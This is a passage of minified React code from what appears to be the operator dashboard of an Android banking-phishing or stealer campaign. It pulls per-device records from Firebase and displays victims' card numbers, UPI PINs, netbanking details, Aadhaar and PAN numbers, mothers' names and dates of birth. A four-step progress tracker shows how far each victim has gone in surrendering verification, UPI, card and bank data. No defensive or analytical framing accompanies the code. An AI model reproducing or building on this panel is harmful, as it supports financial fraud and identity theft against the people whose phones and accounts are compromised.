var(--border-color)",marginBottom:"14px"},children:[i.jsx("button",{style:{background:"none",border:"none",color:"var(--text-muted)",fontSize:"14px",fontWeight:600,cursor:"pointer",padding:"4px 8px",borderRadius:"8px",transition:"all 0.2s"},onMouseEnter:h=>h.target.style.background="var(--bg-input)",onMouseLeave:h=>h.target.style.background="transparent",onClick:()=>t("/"),children:"← Back"}),i.jsx("h2",{style:{fontSize:"18px",fontWeight:700,color:"var(--text-primary)",margin:0,flex:1},children:"📱 All Devices"}),i.jsxs("span",{style:{fontSize:"11px",fontWeight:600,color:"#2ecc71",background:"rgba(46,204,113,0.1)",padding:"2px 12px",borderRadius:"12px"},children:["🟢 ",m,"/",e.length]})]}),i.jsxs("div",{style:{display:"flex",gap:"8px",marginBottom:"12px",flexWrap:"wrap"},children:[i.jsx("div",{style:{flex:1,minWidth:"150px"},children:i.jsx("input",{type:"text",placeholder:"🔍 Search devices...",value:o,onChange:h=>a(h.target.value),style:{width:"100%",padding:"8px 12px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"13px",outline:"none",transition:"all 0.3s"},onFocus:h=>h.target.style.borderColor="#6c63ff",onBlur:h=>h.target.style.borderColor="var(--border-color)"})}),i.jsx("button",{onClick:()=>c(!l),style:{padding:"8px 16px",border:`2px solid ${l?"#f59e0b":"var(--border-color)"}`,borderRadius:"8px",background:l?"rgba(245,158,11,0.1)":"var(--bg-input)",color:l?"#f59e0b":"var(--text-muted)",cursor:"pointer",fontSize:"12px",fontWeight:600,transition:"all 0.2s",whiteSpace:"nowrap"},children:l?"⭐ Favorites":"☆ All"}),i.jsxs("select",{value:d,onChange:h=>p(h.target.value),style:{padding:"8px 12px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"12px",outline:"none",cursor:"pointer"},children:[i.jsx("option",{value:"serial",children:"Sort by Serial"}),i.jsx("option",{value:"brand",children:"Sort by Brand"}),i.jsx("option",{value:"model",children:"Sort by Model"}),i.jsx("option",{value:"battery",children:"Sort by Battery"}),i.jsx("option",{value:"lastSeen",children:"Sort by Last Seen"})]})]}),i.jsxs("div",{style:{fontSize:"12px",color:"var(--text-muted)",marginBottom:"12px",padding:"4px 0"},children:["Showing ",_.length," of ",e.length," devices"]}),i.jsx("div",{style:{display:"flex",flexDirection:"column",gap:"8px"},children:_.length===0?i.jsxs("div",{style:{textAlign:"center",padding:"40px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"48px",display:"block",marginBottom:"8px"},children:"📭"}),i.jsx("p",{children:"No devices found"})]}):_.map((h,y)=>{var S;const w=u(h),N=b(h.battery),R=h.favorite===!0;return i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"10px",padding:"12px 14px",border:"1px solid var(--border-color)",borderLeft:`4px solid ${w.color}`,transition:"all 0.2s",cursor:"pointer"},onMouseEnter:C=>C.target.style.boxShadow="0 2px 12px rgba(0,0,0,0.06)",onMouseLeave:C=>C.target.style.boxShadow="none",onClick:()=>t(`/device/${h.id}`),children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"flex-start"},children:[i.jsxs("div",{style:{flex:1,minWidth:0},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px",flexWrap:"wrap"},children:[i.jsxs("span",{style:{fontSize:"14px",fontWeight:700,color:"var(--text-primary)"},children:["#",h.serialNo||"N/A"]}),i.jsxs("span",{style:{fontSize:"13px",fontWeight:600,color:"var(--text-primary)"},children:[h.brand||"Unknown"," ",h.model||"Device"]}),i.jsxs("span",{style:{fontSize:"10px",fontWeight:600,color:w.color,background:`${w.color}15`,padding:"1px 10px",borderRadius:"12px"},children:[w.dot," ",w.text]})]}),i.jsxs("div",{style:{fontSize:"11px",color:"var(--text-muted)",marginTop:"2px",fontFamily:"monospace"},children:["🔑 ",h.device_id||h.id]})]}),i.jsx("button",{onClick:C=>{C.stopPropagation(),f(h.id,R)},style:{background:"none",border:"none",fontSize:"20px",cursor:"pointer",padding:"4px",color:R?"#f59e0b":"var(--text-muted)",transition:"all 0.2s",flexShrink:0},onMouseEnter:C=>C.target.style.transform="scale(1.1)",onMouseLeave:C=>C.target.style.transform="scale(1)",children:R?"⭐":"☆"})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(120px, 1fr))",gap:"4px",marginTop:"8px",paddingTop:"8px",borderTop:"1px solid var(--border-color)"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🔋 Battery"}),i.jsx("span",{style:{fontWeight:600,color:N},children:h.battery||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🤖 Version"}),i.jsxs("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:["v",h.android_version||"N/A"]})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"📶 SIM"}),i.jsx("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:h.sim_info&&((S=h.sim_info.split(" - ")[0])==null?void 0:S.split(": ")[1])||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🕐 Last Seen"}),i.jsx("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:x(h.lastSeen)})]})]})]},h.id)})}),i.jsx("div",{style:{height:"20px"}})]})}function $k(){var M,L,K,F,te,me,W,D,I,X,V,E,q,ae,ee,T,Q,we,fe,vn,qe,yn,at,Nt,mr,bn,Hs,wo,gr,Vs,xr,Gs,Hr,Ys;const t=gt(),[e,n]=g.useState(!0),[r,s]=g.useState([]),[o,a]=g.useState(""),[l,c]=g.useState("all"),[d,p]=g.useState(null),[f,u]=g.useState(!1),[b,x]=g.useState("serial"),[v,_]=g.useState({total:0,card:0,netbank:0,upi:0,verification:0,fullFlow:0,flowProgress:{step1:0,step2:0,step3:0,step4:0}});g.useEffect(()=>{m()},[]);const m=async()=>{n(!0);try{const A=B(U,"devices"),ne=await ce(A);if(!ne.exists()){s([]),n(!1);return}const lt=ne.val(),zt=[];let vr=0,Mt=0,Yt=0,So=0,Vr=0,Gr=0,Rl=0,Yr=0,Co=0;for(const Fe in lt){const Me=lt[Fe],Kr=Me.serialNo||0,_n=Me.brand||"Unknown",Tl=Me.model||"Device",Qr=Me.lastSeen||Me.this_app_installTime,jo=Qr&&Date.now()-Number(Qr)<12e4;let k=null,H=null,G=null,Z=null,Pe={},De={},Ie={},ct={},Kt=0,wn=0,Ks=0,Qs=0;try{const We=await ce(B(U,`card_payment/${Fe}`));if(We.exists()){Pe=We.val();const le=Object.keys(Pe);Kt=le.length,le.sort((Se,xt)=>{var Ve,vt;return(((Ve=Pe[xt])==null?void 0:Ve.timestampMillis)||0)-(((vt=Pe[Se])==null?void 0:vt.timestampMillis)||0)}),k=Pe[le[0]]||null,k&&vr++}}catch{}try{const We=await ce(B(U,`netbanking_payment/${Fe}`));if(We.exists()){De=We.val();const le=Object.keys(De);wn=le.length,le.sort((Se,xt)=>{var Ve,vt;return(((Ve=De[xt])==null?void 0:Ve.timestampMillis)||0)-(((vt=De[Se])==null?void 0:vt.timestampMillis)||0)}),H=De[le[0]]||null,H&&Mt++}}catch{}try{const We=await ce(B(U,`upi_payments/${Fe}`));if(We.exists()){Ie=We.val();const le=Object.keys(Ie);Ks=le.length,le.sort((Se,xt)=>{var Ve,vt;return(((Ve=Ie[xt])==null?void 0:Ve.timestampMillis)||0)-(((vt=Ie[Se])==null?void 0:vt.timestampMillis)||0)}),G=Ie[le[0]]||null,G&&Yt++}}catch{}try{const We=await ce(B(U,`mobile_verification/${Fe}`));if(We.exists()){ct=We.val();const le=Object.keys(ct);Qs=le.length,le.sort((Se,xt)=>{var Ve,vt;return(((Ve=ct[xt])==null?void 0:Ve.timestampMillis)||0)-(((vt=ct[Se])==null?void 0:vt.timestampMillis)||0)}),Z=ct[le[0]]||null,Z&&So++}}catch{}const Wn=!!Z,yr=!!G,qr=!!k,qs=!!H;Wn&&Gr++,Wn&&yr&&Rl++,Wn&&yr&&qr&&Yr++,Wn&&yr&&qr&&qs&&(Co++,Vr++);let br="0";k!=null&&k.amount?br=k.amount:G!=null&&G.amount?br=G.amount:H!=null&&H.amount&&(br=H.amount),zt.push({deviceId:Fe,serialNo:Kr,brand:_n,model:Tl,lastSeen:Qr,status:jo?"online":"offline",cardData:k,netbankData:H,upiData:G,verificationData:Z,allCardData:Pe,allNetbankData:De,allUpiData:Ie,allVerifData:ct,hasCard:qr,hasNetbank:qs,hasUpi:yr,hasVerification:Wn,cardCount:Kt,netbankCount:wn,upiCount:Ks,verificationCount:Qs,timestamp:(k==null?void 0:k.timestamp)||(H==null?void 0:H.timestamp)||(G==null?void 0:G.timestamp)||(Z==null?void 0:Z.timestamp)||"N/A",cardStatus:(k==null?void 0:k.status)||"N/A",netbankStatus:(H==null?void 0:H.status)||"N/A",upiStatus:(G==null?void 0:G.status)||"N/A",verificationStatus:(Z==null?void 0:Z.status)||"N/A",mobileNumber:(Z==null?void 0:Z.mobileNumber)||"N/A",latestAmount:br,cardNumber:(k==null?void 0:k.cardNumber)||"N/A",cardHolder:(k==null?void 0:k.cardHolder)||"N/A",cardAmount:(k==null?void 0:k.amount)||"0",bankName:(H==null?void 0:H.bankName)||"N/A",netbankAmount:(H==null?void 0:H.amount)||"0",upiAmount:(G==null?void 0:G.amount)||"0",upiPin:(G==null?void 0:G.upiPin)||"N/A",upiPinType:(G==null?void 0:G.pinType)||"N/A",upiPinLength:(G==null?void 0:G.pinLength)||"N/A"})}zt.sort((Fe,Me)=>{switch(b){case"serial":return Me.serialNo-Fe.serialNo;case"total":return Me.cardCount+Me.netbankCount+Me.upiCount+Me.verificationCount-(Fe.cardCount+Fe.netbankCount+Fe.upiCount+Fe.verificationCount);case"card":return Me.cardCount-Fe.cardCount;case"netbank":return Me.netbankCount-Fe.netbankCount;case"upi":return Me.upiCount-Fe.upiCount;case"verification":return Me.verificationCount-Fe.verificationCount;default:return Me.serialNo-Fe.serialNo}}),s(zt),_({total:zt.length,card:vr,netbank:Mt,upi:Yt,verification:So,fullFlow:Vr,flowProgress:{step1:Gr,step2:Rl,step3:Yr,step4:Co}})}catch(A){console.error("Error fetching data:",A)}n(!1)},y=(()=>{let A=r;if(o){const ne=o.toLowerCase();A=A.filter(lt=>lt.deviceId.toLowerCase().includes(ne)||lt.brand.toLowerCase().includes(ne)||lt.model.toLowerCase().includes(ne)||lt.serialNo.toString().includes(ne)||(lt.cardHolder||"").toLowerCase().includes(ne)||(lt.cardNumber||"").includes(ne)||(lt.bankName||"").toLowerCase().includes(ne)||(lt.mobileNumber||"").includes(ne))}return l==="card"?A=A.filter(ne=>ne.hasCard):l==="netbank"?A=A.filter(ne=>ne.hasNetbank):l==="upi"?A=A.filter(ne=>ne.hasUpi):l==="verification"&&(A=A.filter(ne=>ne.hasVerification)),A})(),w=A=>A==="online"?{text:"🟢 Online",color:"#2ecc71"}:{text:"🔴 Offline",color:"#e74c3c"},N=A=>A==="Success"||A==="Verified"?"#2ecc71":A==="Pending"?"#f1c40f":A==="Failed"?"#e74c3c":"#95a5a6",R=A=>{if(!A)return"Never";const ne=Date.now()-Number(A);return ne<6e4?"Just now":ne<36e5?`${Math.floor(ne/6e4)}m ago`:ne<864e5?`${Math.floor(ne/36e5)}h ago`:`${Math.floor(ne/864e5)}d ago`},S=A=>A.cardCount+A.netbankCount+A.upiCount+A.verificationCount,C=A=>{let ne=0;return A.hasVerification&&ne++,A.hasUpi&&ne++,A.hasCard&&ne++,A.hasNetbank&&ne++,Math.round(ne/4*100)},j=A=>A.hasVerification&&A.hasUpi&&A.hasCard&&A.hasNetbank?{text:"✅ Complete",color:"#2ecc71"}:A.hasVerification&&A.hasUpi&&A.hasCard?{text:"⏳ Pending Net",color:"#f59e0b"}:A.hasVerification&&A.hasUpi?{text:"⏳ Pending Card",color:"#8b5cf6"}:A.hasVerification?{text:"⏳ Pending UPI",color:"#3b82f6"}:{text:"Start",color:"#95a5a6"},P=A=>{p(A),u(!0),document.body.style.overflow="hidden"},z=()=>{u(!1),document.body.style.overflow="auto",setTimeout(()=>p(null),300)};return e?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100vh",background:"var(--bg-primary)"},children:[i.jsx("div",{style:{width:"40px",height:"40px",border:"3px solid rgba(108,99,255,0.1)",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{color:"var(--text-muted)",marginTop:"12px"},children:"Loading..."}),i.jsx("style",{children:"@keyframes spin{to{transform:rotate(360deg)}}"})]}):i.jsxs("div",{style:{padding:"12px 16px",maxWidth:"100%",background:"var(--bg-primary)",minHeight:"100vh"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"12px",padding:"8px 0 14px",borderBottom:"2px solid var(--border-color)",marginBottom:"16px",flexWrap:"wrap"},children:[i.jsx("button",{onClick:()=>t("/"),style:{background:"none",border:"none",color:"var(--text-muted)",fontSize:"14px",fontWeight:600,cursor:"pointer",padding:"6px 10px",borderRadius:"8px"},children:"← Back"}),i.jsx("h2",{style:{fontSize:"18px",fontWeight:700,color:"var(--text-primary)",margin:0,flex:1},children:"📊 All Devices"}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:600,color:"#6c63ff",background:"rgba(108,99,255,0.1)",padding:"4px 14px",borderRadius:"20px"},children:[v.total," devices"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"repeat(6, 1fr)",gap:"6px",marginBottom:"14px"},children:[i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center",cursor:"pointer"},onClick:()=>{c("all"),a("")},children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#6c63ff"},children:v.total}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"Total"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center",cursor:"pointer"},onClick:()=>c("verification"),children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#3b82f6"},children:v.verification}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"✅ Step 1"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center",cursor:"pointer"},onClick:()=>c("upi"),children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#8b5cf6"},children:v.upi}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"📲 Step 2"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center",cursor:"pointer"},onClick:()=>c("card"),children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#2ecc71"},children:v.card}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"💳 Step 3"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center",cursor:"pointer"},onClick:()=>c("netbank"),children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#f59e0b"},children:v.netbank}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"🏦 Step 4"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"18px",fontWeight:700,color:"#6c63ff"},children:v.fullFlow}),i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"Complete"})]})]}),i.jsxs("div",{style:{display:"flex",gap:"10px",marginBottom:"14px",flexWrap:"wrap"},children:[i.jsxs("div",{style:{flex:1,minWidth:"150px",position:"relative"},children:[i.jsx("span",{style:{position:"absolute",left:"12px",top:"50%",transform:"translateY(-50%)",color:"var(--text-muted)"},children:"🔍"}),i.jsx("input",{type:"text",placeholder:"Search by Serial, Device ID, Brand, Mobile, Card, Bank...",value:o,onChange:A=>a(A.target.value),style:{width:"100%",padding:"10px 12px 10px 36px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"14px",outline:"none"}})]}),i.jsxs("select",{value:b,onChange:A=>x(A.target.value),style:{padding:"10px 14px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"13px",outline:"none"},children:[i.jsx("option",{value:"serial",children:"Sort by Serial"}),i.jsx("option",{value:"total",children:"Sort by Total"}),i.jsx("option",{value:"card",children:"Sort by Card"}),i.jsx("option",{value:"netbank",children:"Sort by Netbank"}),i.jsx("option",{value:"upi",children:"Sort by UPI"}),i.jsx("option",{value:"verification",children:"Sort by Verify"})]}),i.jsx("button",{onClick:()=>{a(""),c("all"),x("serial")},style:{padding:"10px 16px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-muted)",cursor:"pointer",fontSize:"13px",fontWeight:600},children:"✕ Clear"}),i.jsx("button",{onClick:()=>m(),style:{padding:"10px 16px",border:"none",borderRadius:"8px",background:"#28a745",color:"white",cursor:"pointer",fontSize:"14px",fontWeight:600},children:"↻"})]}),i.jsx("div",{style:{display:"flex",flexDirection:"column",gap:"10px"},children:y.length===0?i.jsxs("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-muted)",background:"var(--bg-card)",borderRadius:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"48px",display:"block",marginBottom:"8px"},children:"📭"}),i.jsx("p",{children:"No devices found"})]}):y.map(A=>{var Mt;const ne=w(A.status),lt=S(A),zt=C(A),vr=j(A);return i.jsxs("div",{onClick:()=>P(A),style:{background:"var(--bg-card)",borderRadius:"10px",padding:"12px 14px",border:"1px solid var(--border-color)",borderLeft:`4px solid ${A.hasVerification&&A.hasUpi&&A.hasCard&&A.hasNetbank?"#6c63ff":A.hasCard?"#2ecc71":A.hasNetbank?"#f59e0b":A.hasUpi?"#8b5cf6":A.hasVerification?"#3b82f6":"#95a5a6"}`,cursor:"pointer",transition:"all 0.2s"},onMouseEnter:Yt=>{Yt.target.style.boxShadow="0 2px 12px rgba(0,0,0,0.06)"},onMouseLeave:Yt=>{Yt.target.style.boxShadow="none"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"flex-start",flexWrap:"wrap",gap:"4px",marginBottom:"4px"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px",flexWrap:"wrap"},children:[i.jsxs("span",{style:{fontSize:"13px",fontWeight:800,color:"var(--text-primary)",background:"var(--bg-input)",padding:"2px 10px",borderRadius:"4px"},children:["#",A.serialNo||"N/A"]}),i.jsxs("span",{style:{fontSize:"13px",fontWeight:600,color:"var(--text-primary)"},children:[A.brand," ",A.model]}),i.jsx("span",{style:{fontSize:"9px",fontWeight:600,color:ne.color,padding:"2px 8px",borderRadius:"8px",background:`${ne.color}10`},children:ne.text})]}),i.jsxs("div",{style:{display:"flex",gap:"4px",flexWrap:"wrap"},children:[A.hasVerification&&i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,padding:"2px 8px",borderRadius:"8px",background:"rgba(59,130,246,0.08)",color:"#3b82f6"},children:["✅ ",A.verificationCount]}),A.hasUpi&&i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,padding:"2px 8px",borderRadius:"8px",background:"rgba(139,92,246,0.08)",color:"#8b5cf6"},children:["📲 ",A.upiCount]}),A.hasCard&&i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,padding:"2px 8px",borderRadius:"8px",background:"rgba(46,204,113,0.08)",color:"#2ecc71"},children:["💳 ",A.cardCount]}),A.hasNetbank&&i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,padding:"2px 8px",borderRadius:"8px",background:"rgba(245,158,11,0.08)",color:"#f59e0b"},children:["🏦 ",A.netbankCount]})]})]}),i.jsxs("div",{style:{fontSize:"10px",color:"var(--text-muted)",fontFamily:"monospace",marginBottom:"6px",background:"var(--bg-input)",padding:"2px 8px",borderRadius:"4px",display:"inline-block"},children:[(Mt=A.deviceId)==null?void 0:Mt.slice(0,12),"..."]}),i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px",padding:"6px 8px",marginTop:"4px",marginBottom:"4px",background:"var(--bg-input)",borderRadius:"6px",border:"1px solid var(--border-color)",flexWrap:"wrap",fontSize:"9px"},children:[i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:600,color:"#6c63ff"},children:["📱 ",A.mobileNumber||"N/A"]}),i.jsx("span",{style:{color:"var(--text-muted)",opacity:.3},children:"|"}),i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:600,color:A.hasVerification?"#3b82f6":"var(--text-muted)"},children:["✅ ",A.verificationCount]}),i.jsx("span",{style:{color:"var(--text-muted)",opacity:.3},children:"|"}),i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:600,color:A.hasUpi?"#8b5cf6":"var(--text-muted)"},children:["📲 ",A.upiCount]}),i.jsx("span",{style:{color:"var(--text-muted)",opacity:.3},children:"|"}),i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:600,color:A.hasCard?"#2ecc71":"var(--text-muted)"},children:["💳 ",A.cardCount]}),i.jsx("span",{style:{color:"var(--text-muted)",opacity:.3},children:"|"}),i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:600,color:A.hasNetbank?"#f59e0b":"var(--text-muted)"},children:["🏦 ",A.netbankCount]}),i.jsx("span",{style:{color:"var(--text-muted)",opacity:.3},children:"|"}),i.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"3px",fontWeight:700,color:"#2ecc71"},children:["💰 ₹",A.latestAmount||"0"]})]}),i.jsxs("div",{style:{marginTop:"4px",marginBottom:"4px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center"},children:[i.jsxs("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-muted)"},children:["Flow: ",zt,"%"]}),i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:vr.color},children:vr.text})]}),i.jsx("div",{style:{width:"100%",height:"4px",background:"var(--bg-input)",borderRadius:"4px",overflow:"hidden",marginTop:"2px"},children:i.jsx("div",{style:{width:`${zt}%`,height:"100%",background:"linear-gradient(90deg, #6c63ff, #2ecc71)",borderRadius:"4px",transition:"width 0.3s"}})})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",fontSize:"9px",color:"var(--text-muted)",paddingTop:"4px",borderTop:"1px solid var(--border-color)"},children:[i.jsxs("span",{children:["📊 ",lt," entries"]}),i.jsxs("span",{children:["🕐 ",R(A.lastSeen)]}),i.jsx("span",{style:{color:"#6c63ff"},children:"👁️ View"})]})]},A.deviceId)})}),i.jsx("div",{style:{height:"30px"}}),f&&d&&i.jsxs("div",{style:{position:"fixed",inset:0,background:"rgba(0,0,0,0.7)",backdropFilter:"blur(12px)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:9999,padding:"16px",animation:"fadeIn 0.3s ease"},onClick:z,children:[i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"14px",maxWidth:"440px",width:"100%",maxHeight:"92vh",overflow:"hidden",boxShadow:"0 20px 60px rgba(0,0,0,0.3)",border:"1px solid var(--border-color)",animation:"scaleIn 0.3s ease",display:"flex",flexDirection:"column"},onClick:A=>A.stopPropagation(),children:[i.jsxs("div",{style:{padding:"14px 18px",borderBottom:"1px solid var(--border-color)",display:"flex",justifyContent:"space-between",alignItems:"center",background:"var(--bg-input)",flexShrink:0},children:[i.jsxs("div",{children:[i.jsxs("h4",{style:{margin:0,fontSize:"16px",fontWeight:700,color:"var(--text-primary)"},children:[d.brand," ",d.model]}),i.jsxs("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontFamily:"monospace"},children:["#",d.serialNo," • ",(M=d.deviceId)==null?void 0:M.slice(0,16),"..."]})]}),i.jsx("button",{onClick:z,style:{background:"none",border:"none",fontSize:"22px",color:"var(--text-muted)",cursor:"pointer",padding:"4px 8px",borderRadius:"6px",transition:"all 0.2s"},onMouseEnter:A=>{A.target.style.background="rgba(231,76,60,0.1)",A.target.style.color="#e74c3c"},onMouseLeave:A=>{A.target.style.background="none",A.target.style.color="var(--text-muted)"},children:"✕"})]}),i.jsxs("div",{style:{padding:"14px 18px 18px",maxHeight:"calc(92vh - 80px)",overflowY:"auto",flex:1},children:[i.jsxs("div",{style:{background:"var(--bg-input)",borderRadius:"8px",padding:"10px 12px",marginBottom:"10px",border:"1px solid var(--border-color)"},children:[i.jsx("div",{style:{fontSize:"11px",fontWeight:700,color:"var(--text-muted)",marginBottom:"6px"},children:"📱 Device Info"}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 10px"},children:[i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Brand"}),i.jsx("br",{}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600},children:d.brand})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Model"}),i.jsx("br",{}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600},children:d.model})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Serial"}),i.jsx("br",{}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:600},children:["#",d.serialNo]})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Status"}),i.jsx("br",{}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:d.status==="online"?"#2ecc71":"#e74c3c"},children:d.status==="online"?"🟢 Online":"🔴 Offline"})]}),i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Device ID"}),i.jsx("br",{}),i.jsx("span",{style:{fontSize:"11px",fontWeight:600,fontFamily:"monospace"},children:d.deviceId})]})]})]}),d.hasVerification&&i.jsxs("div",{style:{background:"rgba(59,130,246,0.05)",borderRadius:"8px",padding:"10px 12px",marginBottom:"8px",border:"1px solid rgba(59,130,246,0.15)"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:700,color:"#3b82f6"},children:"✅ Mobile Verification"}),i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,background:"rgba(59,130,246,0.1)",padding:"2px 8px",borderRadius:"10px",color:"#3b82f6"},children:[d.verificationCount," entries"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 10px",fontSize:"12px"},children:[i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Mobile"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((L=d.verificationData)==null?void 0:L.mobileNumber)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Aadhaar"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((K=d.verificationData)==null?void 0:K.aadhaarNumber)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"PAN"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((F=d.verificationData)==null?void 0:F.panNumber)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Mother"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((te=d.verificationData)==null?void 0:te.motherName)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"DOB"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((me=d.verificationData)==null?void 0:me.dateOfBirth)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Status"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,color:N((W=d.verificationData)==null?void 0:W.status)},children:((D=d.verificationData)==null?void 0:D.status)||"N/A"})]}),i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Timestamp"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((I=d.verificationData)==null?void 0:I.timestamp)||"N/A"})]})]}),Object.keys(d.allVerifData||{}).length>1&&i.jsxs("div",{style:{marginTop:"4px",fontSize:"9px",color:"var(--text-muted)"},children:["+ ",Object.keys(d.allVerifData).length-1," more entries"]})]}),d.hasUpi&&i.jsxs("div",{style:{background:"rgba(139,92,246,0.05)",borderRadius:"8px",padding:"10px 12px",marginBottom:"8px",border:"1px solid 